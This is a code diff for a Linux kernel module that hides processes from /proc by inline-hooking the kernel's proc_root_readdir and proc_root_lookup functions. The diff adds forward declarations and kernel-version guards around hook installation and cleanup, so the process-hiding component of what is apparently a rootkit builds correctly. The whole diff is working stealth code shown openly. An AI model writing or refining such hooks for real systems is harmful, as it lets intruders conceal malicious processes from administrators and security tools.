@@ -85,6 +85,10 @@ void clear_hidden_pids(void) {
 // --- Hook for readdir ---
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+
+// Forward declaration to solve circular dependency
+static struct p_hook_struct p_proc_root_readdir_hook;
+
 static int (*original_proc_root_readdir)(struct file *, struct dir_context *);
 
 struct hooked_dir_context {
@@ -128,10 +132,6 @@ static int hooked_proc_root_readdir(struct file *file, struct dir_context *ctx)
     return ret;
 }
 
-#else
-// Legacy kernel support for readdir is more complex and omitted for this refactoring.
-#endif
-
 static char p_proc_root_readdir_hook_state = 0;
 static struct p_hook_struct p_proc_root_readdir_hook = {
     .name = "proc_root_readdir",
@@ -139,7 +139,12 @@ static struct p_hook_struct p_proc_root_readdir_hook = {
 };
 GENERATE_INSTALL_FUNC(proc_root_readdir)
 
+#endif
+
 // --- Hook for lookup ---
+
+// Forward declaration
+static struct p_hook_struct p_proc_root_lookup_hook;
 
 static struct dentry * (*original_proc_root_lookup)(struct inode *,struct dentry *, unsigned int);
 
@@ -171,14 +176,18 @@ GENERATE_INSTALL_FUNC(proc_root_lookup)
 int hide_proc_init(void) {
     printk(KERN_INFO "[hide_proc] Initializing process hiding (via inline hook)\n");
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
     if (p_install_proc_root_readdir_hook(0) != 0) {
         printk(KERN_ERR "[hide_proc] Failed to hook proc_root_readdir.\n");
         return -EFAULT;
     }
+#endif
 
     if (p_install_proc_root_lookup_hook(0) != 0) {
         printk(KERN_ERR "[hide_proc] Failed to hook proc_root_lookup.\n");
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
         p_uninstall_proc_root_readdir_hook(); // Clean up previous hook
+#endif
         return -EFAULT;
     }
 
@@ -188,7 +197,9 @@ int hide_proc_init(void) {
 
 void hide_proc_exit(void) {
     printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring hooks)\n");
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
     p_uninstall_proc_root_readdir_hook();
+#endif
     p_uninstall_proc_root_lookup_hook();
     clear_hidden_pids();
 }
